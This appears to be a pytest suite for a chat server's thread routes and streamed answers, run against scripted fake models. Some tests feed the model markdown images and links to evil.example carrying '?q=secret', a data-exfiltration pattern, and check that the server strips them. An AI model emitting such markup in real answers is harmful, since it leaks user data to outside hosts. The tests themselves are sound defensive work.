"""Tests for step S4.2: the thread routes and the streamed answer.

Everything is real except the models: the app runs its lifespan, the notes are ingested through the
API into real SQLite and Chroma (with the fixed-vector fake embedder), the real hybrid retriever
searches them, the real answer graph runs with a real ``AsyncSqliteSaver`` on a file, and the chat
model and the rewrite call are the scripted fakes of ``chatkit``. A request goes in through the test
client and the whole server-sent-event response is read back and parsed with ``geekbot.sse``.

The heartbeat test at the end is the one PLAN.md section 6.3 asks for: ``/healthz`` stays fast while
an answer streams, with a blocking search and a blocking model stream running in worker threads.
"""

import asyncio
import re
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import httpx
import pytest
from chatkit import REWRITE, ScriptedChat, ScriptedCondenser, ScriptedRetriever
from fastapi.testclient import TestClient
from serverkit import (
    ask,
    assert_heartbeat,
    ingest_note,
    make_app,
    ping_until_done,
    run_timed,
    settings_for,
)

from geekbot.agent.runner import THREADS_DB, ThreadInfo, check_thread_name, run_turn
from geekbot.agent.runtime import AgentContext, UnavailableChat, UnavailableRetriever
from geekbot.server.schemas import AskRequest, MessageOut, ThreadOut, ThreadSummary, TurnOut
from geekbot.server.threads import _answer_events
from geekbot.sse import parse_text

pytestmark = pytest.mark.usefixtures("clean_geekbot_env")

THREAD = "t-test"
Q = "Where do zebras live?"


@pytest.fixture
def client(tmp_path: Path) -> Iterator[TestClient]:
    """An app with the default scripted models and one note ingested."""
    with TestClient(make_app(tmp_path)) as opened:
        ingest_note(opened, tmp_path)
        yield opened


# --- creating, listing, showing, deleting ----------------------------------------------------


def test_a_new_thread_id_is_a_valid_name_and_nothing_is_stored_for_it(client: TestClient) -> None:
    created = client.post("/v1/threads")
    assert created.status_code == 201
    body = created.json()
    assert re.fullmatch(r"t-[0-9a-f]{12}", body["thread_id"])
    assert check_thread_name(body["thread_id"]) == body["thread_id"]
    assert body["mode"] == "chat"
    assert client.get(f"/v1/threads/{body['thread_id']}").status_code == 404
    assert client.get("/v1/threads").json() == []
    assert client.post("/v1/threads").json()["thread_id"] != body["thread_id"]


def test_the_list_starts_empty(client: TestClient) -> None:
    assert client.get("/v1/threads").json() == []


def test_an_answered_thread_is_listed_with_its_preview(client: TestClient) -> None:
    ask(client, THREAD, Q)
    (summary,) = client.get("/v1/threads").json()
    assert summary["thread_id"] == THREAD
    assert summary["mode"] == "chat"
    assert summary["csv_file"] is None
    assert (summary["turns"], summary["message_count"]) == (1, 2)
    assert summary["preview"] == Q
    assert summary["taint"] == ["KB", "USER"]
    assert summary["tainted"] is True
    assert summary["updated_at"]


def test_threads_are_listed_newest_first_and_the_limit_applies(client: TestClient) -> None:
    for name in ("t-a", "t-b", "t-c"):
        ask(client, name, Q)
    names = [t["thread_id"] for t in client.get("/v1/threads").json()]
    assert names == ["t-c", "t-b", "t-a"]
    ask(client, "t-a", Q)  # asked again: it moves to the top
    assert next(t["thread_id"] for t in client.get("/v1/threads").json()) == "t-a"
    assert len(client.get("/v1/threads", params={"limit": 2}).json()) == 2


@pytest.mark.parametrize("limit", [0, 201, -1, "many"])
def test_the_list_limit_must_be_a_sensible_number(client: TestClient, limit: Any) -> None:
    assert client.get("/v1/threads", params={"limit": limit}).status_code == 422


def test_a_thread_is_shown_with_its_messages_and_the_sources_of_each_answer(
    client: TestClient,
) -> None:
    """Citations persist: the sources are in the thread, not only in the stream that carried them."""
    ask(client, THREAD, Q)
    shown = client.get(f"/v1/threads/{THREAD}").json()
    assert shown["turns"] == 1 and shown["message_count"] == 2
    user, assistant = shown["messages"]
    assert (user["id"], user["role"], user["content"]) == ("t1-user", "user", Q)
    assert user["labels"] == ["USER"]
    assert (user["cited"], user["sources"]) == ([], [])
    assert (assistant["id"], assistant["role"]) == ("t1-assistant", "assistant")
    assert assistant["content"] == "Ninety days [1]."
    assert assistant["labels"] == ["KB", "USER"]
    assert assistant["cited"] == [1]
    (source, *_) = assistant["sources"]
    assert source["n"] == 1
    assert source["path"].endswith("zebras.txt")
    assert set(source) == {"n", "chunk_id", "title", "path", "page", "section"}  # no passage text


def test_a_thread_can_be_deleted(client: TestClient) -> None:
    ask(client, THREAD, Q)
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 204
    assert client.get(f"/v1/threads/{THREAD}").status_code == 404
    assert client.get("/v1/threads").json() == []
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 404  # already gone


def test_deleting_or_showing_a_thread_that_never_existed_is_404(client: TestClient) -> None:
    assert client.delete("/v1/threads/t-nothing").status_code == 404
    assert client.get("/v1/threads/t-nothing").status_code == 404


BAD_NAMES = ["bad name", ".hidden", "-dash", "a" * 65, "semi;colon", "percent%25"]


@pytest.mark.parametrize("name", BAD_NAMES)
def test_a_bad_thread_name_is_refused_by_every_route(client: TestClient, name: str) -> None:
    assert client.get(f"/v1/threads/{name}").status_code == 422
    assert client.delete(f"/v1/threads/{name}").status_code == 422
    posted = client.post(f"/v1/threads/{name}/messages", json={"question": Q})
    assert posted.status_code == 422
    assert "not a usable thread name" in posted.json()["detail"]


# --- the stream ---------------------------------------------------------------------------------


def test_a_question_streams_meta_then_the_answer_then_done(client: TestClient) -> None:
    asked = ask(client, THREAD, Q)
    assert asked.status == 200
    assert asked.names[0] == "meta"
    assert asked.names[-1] == "done"
    assert set(asked.names) == {"meta", "text", "done"}  # warm, no reasoning, no failure
    assert asked.data("meta") == {
        "thread_id": THREAD,
        "turn": 1,
        "mode": "chat",
        "model": "fake-model:1b",
        "think": False,
    }
    done = asked.data("done")
    assert done["answer"] == "Ninety days [1]."
    assert asked.text == done["answer"]  # what was shown while it streamed is what was kept


def test_the_response_is_an_event_stream_that_nobody_may_cache(client: TestClient) -> None:
    response = client.post(f"/v1/threads/{THREAD}/messages", json={"question": Q})
    assert response.headers["content-type"].startswith("text/event-stream")
    assert response.headers["cache-control"] == "no-store"


def test_the_done_event_carries_the_whole_turn(client: TestClient) -> None:
    done = ask(client, THREAD, Q).data("done")
    assert (done["thread_id"], done["turn"], done["mode"]) == (THREAD, 1, "chat")
    assert done["model"] == "fake-model:1b"
    assert done["abstained"] is False
    assert (done["cited"], done["dropped_citations"]) == ([1], [])
    (source, *_) = done["sources"]
    assert source["n"] == 1
    assert source["path"].endswith("zebras.txt")
    assert "Zebras live on the savanna." in source["text"]  # the passage, for the evidence view
    assert isinstance(source["score"], float)
    assert done["labels"] == ["KB", "USER"]
    assert done["thread_taint"] == ["KB", "USER"]
    assert done["tainted"] is True
    assert done["searched_as"] is None  # a first question is searched as typed
    assert done["rewrite_error"] is None
    assert done["citation_checks"] == [] and done["citation_check_error"] is None
    assert done["removed_markup"] == []
    assert "total" in done["retrieval_ms"]
    assert done["generation"]["seconds"] >= 0
    assert "first_token_seconds" in done["generation"]


def test_a_follow_up_is_rewritten_and_the_turn_says_what_was_searched(client: TestClient) -> None:
    ask(client, THREAD, Q)
    second = ask(client, THREAD, "And in winter?")
    assert second.data("meta")["turn"] == 2
    done = second.data("done")
    assert done["turn"] == 2
    assert done["searched_as"] == REWRITE
    assert len(client.app.state.fakes.condenser.calls) == 1  # type: ignore[attr-defined]
    assert client.get(f"/v1/threads/{THREAD}").json()["message_count"] == 4


def test_think_is_passed_on_and_shown_in_the_meta_event(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path)) as client:
        ingest_note(client, tmp_path)
        fakes = client.app.state.fakes  # type: ignore[attr-defined]
        plain = ask(client, THREAD, Q)
        assert plain.data("meta")["think"] is False
        assert fakes.thinks == []  # an ordinary turn builds no new model
        thinking = ask(client, THREAD, Q, think=True)
        assert thinking.data("meta")["think"] is True
        assert fakes.thinks == [True]


def stages_of(asked: Any) -> list[str]:
    return [event.data["stage"] for event in asked.events if event.event == "status"]


def test_steps_are_streamed_only_to_a_request_that_asks_for_them(client: TestClient) -> None:
    quiet = ask(client, THREAD, Q)
    assert "status" not in quiet.names  # S3.6 changed nothing for a client that does not ask
    chatty = ask(client, "t-steps", Q, steps=True)
    assert chatty.names[0] == "meta" and chatty.names[-1] == "done"
    # A sequential retriever is one step; there is nothing separate to rank.
    assert stages_of(chatty) == ["searching", "writing"]
    assert chatty.text == quiet.text


def test_a_staged_search_streams_searching_ranking_and_writing(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path, staged=True)) as client:
        ingest_note(client, tmp_path)
        asked = ask(client, THREAD, Q, steps=True)
        assert stages_of(asked) == ["searching", "ranking", "writing"]
        status_at = [i for i, name in enumerate(asked.names) if name == "status"]
        assert asked.names.index("text") > status_at[-1]  # the steps come before the first word
        done = asked.data("done")
        assert done["answer"] == "Ninety days [1]."
        assert done["sources"][0]["path"].endswith("zebras.txt")
        # the stages the graph timed: the sequential retriever reports the same ones, minus rerank
        assert {"dense", "lexical", "fusion", "total"} <= set(done["retrieval_ms"])


def test_a_staged_search_finds_what_the_sequential_one_finds(tmp_path: Path) -> None:
    found: dict[str, Any] = {}
    for staged in (False, True):
        with TestClient(make_app(tmp_path, staged=staged)) as client:
            if not staged:
                ingest_note(client, tmp_path)  # the second app opens the same data folder
            done = ask(client, f"t-{staged}", Q).data("done")
            found[str(staged)] = done["sources"]
    assert found["True"] == found["False"] != []


def test_a_nothing_found_turn_is_an_abstention_without_sources(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path, retriever=ScriptedRetriever())) as client:
        client.app.state.fakes.retriever.chunks = ()  # type: ignore[attr-defined]
        asked = ask(client, THREAD, Q)
    done = asked.data("done")
    assert done["abstained"] is True
    assert done["sources"] == [] and done["cited"] == []
    assert done["labels"] == []  # the application's own sentence carries no labels
    assert "text" not in asked.names  # the model was never called, so nothing was written live


# --- refusals before the stream ----------------------------------------------------------------


@pytest.mark.parametrize(
    "body", [{"question": ""}, {}, {"question": Q, "extra": 1}, {"question": 5}]
)
def test_a_malformed_request_is_422(client: TestClient, body: dict[str, Any]) -> None:
    assert client.post(f"/v1/threads/{THREAD}/messages", json=body).status_code == 422


def test_an_empty_or_too_long_question_is_refused_with_a_reason_and_stores_nothing(
    client: TestClient,
) -> None:
    blank = ask(client, THREAD, "   ")
    assert blank.status == 422 and "empty" in blank.body["detail"]
    long = ask(
        client, THREAD, "word " * 2000
    )  # about 2,000 tokens by the estimate; the limit is 1,000
    assert long.status == 422 and "too long" in long.body["detail"]
    huge = ask(client, THREAD, "x" * 20_001)
    assert huge.status == 422
    assert client.get(f"/v1/threads/{THREAD}").status_code == 404
    assert client.app.state.gate.busy is False  # type: ignore[attr-defined]


def test_a_second_question_while_one_is_running_is_refused_not_queued(client: TestClient) -> None:
    gate = client.app.state.gate  # type: ignore[attr-defined]
    token = gate.try_acquire("t-other")
    refused = ask(client, THREAD, Q)
    assert refused.status == 409
    assert "already being answered" in refused.body["detail"]
    assert client.delete(f"/v1/threads/{THREAD}").status_code == 409  # same slot
    assert client.get("/v1/health").json()["answering"] is True
    gate.release(token)
    assert ask(client, THREAD, Q).status == 200
    assert client.get("/v1/health").json()["answering"] is False


def test_the_slot_is_free_after_every_kind_of_outcome(tmp_path: Path) -> None:
    chat = ScriptedChat("Fine [1].", RuntimeError("model crashed"), "Fine [1].")
    with TestClient(make_app(tmp_path, chat=chat)) as client:
        ingest_note(client, tmp_path)
        gate = client.app.state.gate  # type: ignore[attr-defined]
        assert ask(client, THREAD, Q).names[-1] == "done"
        assert gate.busy is False
        assert ask(client, THREAD, Q).names[-1] == "error"
        assert gate.busy is False
        assert ask(client, THREAD, Q).names[-1] == "done"
        assert gate.busy is False


# --- failures inside the stream ------------------------------------------------------------------


def test_a_model_failure_is_an_error_event_and_the_turn_is_not_remembered(tmp_path: Path) -> None:
    # A permanent failure; a transient one is retried (S3.6) and is the next test.
    chat = ScriptedChat(RuntimeError("model crashed"), "Fine [1].")
    with TestClient(make_app(tmp_path, chat=chat)) as client:
        ingest_note(client, tmp_path)
        failed = ask(client, THREAD, Q)
        assert failed.status == 200  # the stream had started
        assert failed.names == ["meta", "error"]
        assert "RuntimeError: model crashed" in failed.data("error")["message"]
        assert client.get(f"/v1/threads/{THREAD}").status_code == 404  # nothing was answered
        assert client.get("/v1/threads").json() == []
        again = ask(client, THREAD, Q)
        assert again.names[-1] == "done"
        assert again.data("done")["turn"] == 1  # no gap, no half turn


def test_a_transient_model_failure_is_retried_and_the_user_only_sees_the_answer(
    tmp_path: Path,
) -> None:
    """S3.6: the connection to the model is refused once; the graph runs ``generate`` again (the
    unit-test conftest makes the wait between the two tries zero)."""
    chat = ScriptedChat(ConnectionError("down"), "Fine [1].")
    with TestClient(make_app(tmp_path, chat=chat)) as client:
        ingest_note(client, tmp_path)
        asked = ask(client, THREAD, Q)
        assert asked.names == ["meta", "text", "done"]  # no error event, no second answer
        assert asked.text == "Fine [1]."
        assert asked.data("done")["turn"] == 1
        assert len(chat.calls) == 2  # the failed call and the retry


def test_an_unexpected_failure_is_reported_without_its_details(tmp_path: Path) -> None:
    class Broken(ScriptedRetriever):
        def search(self, query: str, k: int) -> Any:
            raise ValueError("secret detail from a library")

    with TestClient(make_app(tmp_path, retriever=Broken())) as client:
        failed = ask(client, THREAD, Q)
        assert failed.names == ["meta", "error"]
        message = failed.data("error")["message"]
        assert "ValueError" in message and "secret" not in message
        assert client.app.state.gate.busy is False  # type: ignore[attr-defined]


def test_a_reply_of_nothing_but_removed_markup_is_an_error_event(tmp_path: Path) -> None:
    chat = ScriptedChat("![x](http://evil.example/?q=1)")
    with TestClient(make_app(tmp_path, chat=chat)) as client:
        ingest_note(client, tmp_path)
        failed = ask(client, THREAD, Q)
    assert failed.names[-1] == "error"
    assert "images or links" in failed.data("error")["message"]


# --- G3 through the stream -----------------------------------------------------------------------


def test_images_and_links_to_outside_places_never_reach_the_stream(tmp_path: Path) -> None:
    pieces = [
        "Here is the answer ",
        "![x](http://evil.example/?q=secret) ",
        "and a [link](http://evil.example/x) [1].",
    ]
    with TestClient(make_app(tmp_path, chat=ScriptedChat(pieces))) as client:
        ingest_note(client, tmp_path)
        asked = ask(client, THREAD, Q)
    done = asked.data("done")
    for shown in (asked.text, done["answer"]):
        assert "evil.example" not in shown
        assert "![" not in shown
        assert "link" in shown  # the link's text stays
    kinds = sorted(item.split(":")[0] for item in done["removed_markup"])
    assert kinds == ["image", "link"]
    assert all("evil.example" in item for item in done["removed_markup"])


# --- loading the models (--no-warmup) --------------------------------------------------------


def test_a_server_started_without_a_warm_up_loads_on_the_first_question(tmp_path: Path) -> None:
    with TestClient(make_app(tmp_path, warm=False)) as client:
        ingest_note(client, tmp_path)
        fakes = client.app.state.fakes  # type: ignore[attr-defined]
        assert client.get("/v1/health").json()["chat_ready"] is False
        first = ask(client, THREAD, Q)
        assert first.names[:2] == ["meta", "status"]
        assert first.data("status") == {"stage": "loading_model", "model": "fake-model:1b"}
        assert first.names[-1] == "done"
        assert fakes.loads == ["load"]
        assert client.get("/v1/health").json()["chat_ready"] is True
        second = ask(client, THREAD, Q)
        assert "status" not in second.names
        assert fakes.loads == ["load"]  # once


def test_health_reports_the_chat_model(client: TestClient) -> None:
    body = client.get("/v1/health").json()
    assert (body["chat_model"], body["chat_ready"], body["answering"]) == (
        "fake-model:1b",
        True,
        False,
    )


# --- a CSV thread is not a chat thread ---------------------------------------------------------


def make_csv_thread(root: Path, name: str) -> None:
    """Save a one-turn CSV conversation in the app's thread database, as C4's command does."""
    reply = SimpleNamespace(
        markdown="North leads.",
        status="answered",
        model="qwen-fake:3b",
        seconds=0.5,
        model_load_ms=0,
    )
    context = AgentContext(
        retriever=UnavailableRetriever(),
        llm=UnavailableChat(),
        model="qwen-fake:3b",
        top_k=1,
        context_budget_tokens=3000,
        condenser=ScriptedCondenser(),
        csv=SimpleNamespace(ask=lambda question, /: reply),
    )
    asyncio.run(
        run_turn(
            "Which region sells the most?",
            context=context,
            thread=name,
            threads_db=settings_for(root).data_dir / THREADS_DB,
            mode="csv",
            csv_file="sales.csv",
        )
    )


def test_a_csv_thread_is_listed_as_one_and_is_never_answered_from_the_documents(
    tmp_path: Path,
) -> None:
    """A conversation started with ``geekbot csv ask`` holds the plain name of a file the server never
    stored (C5 keeps the stored upload's name), so the server cannot open it again: it says so, and
    a chat question for it is refused as well. Neither is answered from the documents."""
    with TestClient(make_app(tmp_path)) as client:
        ingest_note(client, tmp_path)
        make_csv_thread(tmp_path, "t-csv")
        (summary,) = client.get("/v1/threads").json()
        assert (summary["mode"], summary["csv_file"]) == ("csv", "sales.csv")
        assert summary["taint"] == ["TOOL", "USER"]
        no_file = ask(client, "t-csv", Q)  # the thread is a csv one, so the route takes its branch
        assert no_file.status == 409
        assert "upload the file again" in no_file.body["detail"]
        chat_asked = ask(client, "t-csv", Q, mode="chat")
        assert chat_asked.status == 409
        assert "csv conversation" in chat_asked.body["detail"]
        assert client.app.state.gate.busy is False  # type: ignore[attr-defined]
        shown = client.get("/v1/threads/t-csv").json()
        assert shown["messages"][1]["content"] == "North leads."
        assert shown["messages"][1]["sources"] == []  # a CSV answer has none


# --- the wire shapes on their own ------------------------------------------------------------------


def info(values: dict[str, Any]) -> ThreadInfo:
    return ThreadInfo(thread_id="t-x", values=values, updated_at="2026-10-20T10:00:00+00:00")


def test_the_preview_is_the_first_question_on_one_line_cut_to_80_characters() -> None:
    long = "first   line\nsecond " + "word " * 40
    history = [{"id": "t1-user", "role": "user", "content": long, "labels": ["USER"]}]
    summary = ThreadSummary.of(info({"history": history}))
    assert summary.preview.startswith("first line second word word")
    assert "\n" not in summary.preview and "  " not in summary.preview
    assert len(summary.preview) <= 80 and summary.preview.endswith("...")
    short = [{"id": "t1-user", "role": "user", "content": "How  long?\n", "labels": ["USER"]}]
    assert ThreadSummary.of(info({"history": short})).preview == "How long?"  # not cut, not padded


def test_a_thread_saved_before_modes_existed_is_a_chat_thread() -> None:
    summary = ThreadSummary.of(info({"history": [], "turn": 3}))
    assert (summary.mode, summary.csv_file, summary.turns, summary.message_count) == (
        "chat",
        None,
        3,
        0,
    )
    assert (summary.preview, summary.taint, summary.tainted) == ("", [], False)


def test_a_thread_with_only_user_taint_is_not_tainted() -> None:
    assert ThreadSummary.of(info({"thread_taint": ["USER"]})).tainted is False
    assert ThreadSummary.of(info({"thread_taint": ["USER", "WEB"]})).tainted is True


def test_a_message_from_before_sources_were_kept_has_empty_lists() -> None:
    old = {"id": "t1-assistant", "role": "assistant", "content": "a", "labels": ["KB"]}
    message = MessageOut.of(old)
    assert (message.cited, message.sources) == ([], [])


def test_thread_out_is_the_summary_plus_the_messages_in_order() -> None:
    history = [
        {"id": "t1-user", "role": "user", "content": "q", "labels": ["USER"]},
        {"id": "t1-assistant", "role": "assistant", "content": "a", "labels": []},
    ]
    shown = ThreadOut.of(info({"history": history, "turn": 1}))
    assert [m.id for m in shown.messages] == ["t1-user", "t1-assistant"]
    assert shown.message_count == 2 and shown.updated_at == "2026-10-20T10:00:00+00:00"


def test_a_turn_with_nothing_but_an_answer_has_empty_defaults() -> None:
    turn = TurnOut.of({"answer": "a", "turn": 1}, thread_id="t-x", model="m")
    assert turn.sources == [] and turn.generation == {} and turn.retrieval_ms == {}
    assert turn.mode == "chat" and turn.searched_as is None and turn.tainted is False


def test_a_rewrite_that_equals_the_question_is_not_reported_as_a_rewrite() -> None:
    same = {"answer": "a", "question": "q", "standalone_question": "q"}
    assert TurnOut.of(same, thread_id="t-x", model="m").searched_as is None
    other = {"answer": "a", "question": "q", "standalone_question": "q, in full"}
    assert TurnOut.of(other, thread_id="t-x", model="m").searched_as == "q, in full"


def test_only_the_sources_the_prompt_held_are_in_the_turn() -> None:
    sources = [
        {
            "n": n,
            "chunk_id": f"c{n}",
            "title": "T",
            "path": "/p",
            "page": None,
            "section": "",
            "score": 0.5,
            "text": "passage",
        }
        for n in (1, 2, 3)
    ]
    turn = TurnOut.of({"answer": "a", "sources": sources, "used": 2}, thread_id="t-x", model="m")
    assert [s.n for s in turn.sources] == [1, 2]


# --- the documentation page ---------------------------------------------------------------------


def test_the_interactive_documentation_still_builds(client: TestClient) -> None:
    """FastAPI builds the schema on first request; a bad declaration of the stream would fail here."""
    schema = client.get("/openapi.json")
    assert schema.status_code == 200
    paths = schema.json()["paths"]
    assert "/v1/threads/{thread_id}/messages" in paths
    stream = paths["/v1/threads/{thread_id}/messages"]["post"]["responses"]["200"]
    assert "text/event-stream" in stream["content"]


# --- the stream goes away ------------------------------------------------------------------------


def test_closing_the_stream_early_gives_the_slot_back(tmp_path: Path) -> None:
    """A client that went away cancels the generator; the slot must not stay taken."""

    async def main() -> None:
        app = make_app(tmp_path)
        async with app.router.lifespan_context(app):
            gate = app.state.gate
            token = gate.try_acquire(THREAD)
            events = _answer_events(
                thread_id=THREAD,
                body=AskRequest(question=Q),
                turn=1,
                settings=app.state.settings,
                answering=app.state.answering,
                gate=gate,
                token=token,
            )
            assert (await events.__anext__()).startswith("event: meta\n")
            assert gate.busy is True
            await events.aclose()
            assert gate.busy is False

    asyncio.run(main())


# --- the heartbeat (PLAN.md section 6.3) -----------------------------------------------------------


def test_healthz_stays_fast_while_an_answer_streams(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    """The search blocks a worker thread for 1 s and the model stream sleeps 0.2 s between its pieces.

    If either ran on the event loop, ``/healthz`` would wait for it. The first question is only a
    warm-up (first-use costs are not what is measured), with the delays switched off. The answer
    takes about two seconds, in which ``/healthz`` is asked back to back, 300 times or more; how the
    two signals work, and why the window is that long, is in ``serverkit`` (``assert_heartbeat``).
    """
    chat = ScriptedChat(["Ninety", " days", " ", "[1]", "."])
    retriever = ScriptedRetriever()

    async def main() -> tuple[list[float], httpx.Response]:
        app = make_app(tmp_path, chat=chat, retriever=retriever)
        async with app.router.lifespan_context(app):
            transport = httpx.ASGITransport(app=app)
            async with httpx.AsyncClient(transport=transport, base_url="http://test") as http:
                warm = await http.post("/v1/threads/t-warm/messages", json={"question": Q})
                assert warm.status_code == 200
                assert parse_text(warm.text)[-1].event == "done"  # not an error event
                chat.delay_s, retriever.delay_s = 0.2, 1.0
                answering = asyncio.create_task(
                    http.post(f"/v1/threads/{THREAD}/messages", json={"question": Q})
                )
                latencies = await ping_until_done(http, answering)
                return latencies, answering.result()

    latencies, response = run_timed(main, caplog)
    assert response.status_code == 200
    assert parse_text(response.text)[-1].event == "done"
    assert_heartbeat(latencies, caplog)
